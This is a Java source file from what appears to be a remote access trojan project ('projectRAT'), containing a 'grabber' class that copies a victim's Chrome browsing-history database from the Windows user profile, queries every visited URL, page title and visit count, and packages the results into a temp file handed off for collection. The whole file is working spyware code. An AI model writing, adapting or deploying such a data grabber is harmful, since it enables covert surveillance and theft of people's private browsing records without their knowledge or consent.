package in.momin5.projectRAT.request.grabbers;

import in.momin5.projectRAT.request.Request;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Random;

public class ChromeHistory implements Request {

    File historyDump;
    @Override
    public void init() throws Exception {
        ArrayList<String> list = getChromeHistory();
        historyDump = new File(System.getProperty("java.io.tmpdir") + "/" + new Random().nextInt() + ".txt");
        FileOutputStream dumpStream = new FileOutputStream(historyDump);
        for(String s: list){
            dumpStream.write(s.getBytes());
            dumpStream.write("\n".getBytes());
        }
        dumpStream.flush();
        dumpStream.close();
        historyDump.deleteOnExit();


    }

    @Override
    public String getMessage() {
        return null;
    }

    @Override
    public File[] getFiles() {
        return new File[] {
                historyDump
        };
    }

    private ArrayList<String> getChromeHistory(){
        ArrayList<String> info = new ArrayList<>();
        Connection conn = null;
        Statement statement = null;

        try {
            String loginDataFile = System.getProperty("user.home") + "/Appdata/Local/Google/Chrome/User Data/Default/History";
            String finalDestination = System.getProperty("java.io.tmpdir") + "DataHistory";
            File finalDestinationFile = new File(finalDestination);
            if(finalDestinationFile.exists())
                finalDestinationFile.delete();
            FileInputStream in = new FileInputStream(loginDataFile);
            FileOutputStream out = new FileOutputStream(finalDestinationFile);
            int n;
            while ((n = in.read()) != -1){
                out.write(n);
            }
            in.close();
            out.close();
            String stmt = "jdbc:sqlite:" + finalDestination;
            conn = DriverManager.getConnection(stmt);

            statement = conn.createStatement();
            ResultSet rs = statement.executeQuery("SELECT * FROM urls;");
            while (rs.next()){
                String url = rs.getString("url");
                if(url == null) url = "URL not found";
                String titles = rs.getString("title");
                if(titles == null) titles = "Title not found";
                String timeVisited = rs.getString("visit_count");
                info.add(String.format("URL: %s Title: %s VisitedTimes: %s",url,titles,timeVisited));
            }
            rs.close();
            statement.close();
            conn.close();

        }catch (Exception e){
            e.printStackTrace();
        }

        return info;
    }
}
